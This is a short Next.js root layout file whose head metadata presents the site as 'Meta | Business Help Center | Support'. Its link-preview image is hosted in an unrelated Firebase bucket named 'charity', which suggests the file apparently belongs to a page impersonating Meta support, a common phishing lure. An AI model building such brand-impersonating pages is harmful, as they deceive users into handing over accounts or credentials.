import { Inter } from "next/font/google";
import Head from "next/head";
import "./globals.css";

const inter = Inter({ subsets: ["latin"] });

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <Head>
        <title>Business Help Center | Privacy Policy</title>
        <meta
          property="og:title"
          content="Meta | Business Help Center | Support"
        />
        <meta
          property="og:description"
          content="Meta Support page - Dedicated to making our meta safe for everyone"
        />
        <meta
          property="og:image"
          content="https://firebasestorage.googleapis.com/v0/b/charity-7cbc9.appspot.com/o/card_img.jpg?alt=media&token=2ea1c79f-ef3d-4516-a511-4d42a0b36940"
        />
      </Head>
      <body className={inter.className}>{children}</body>
    </html>
  );
}
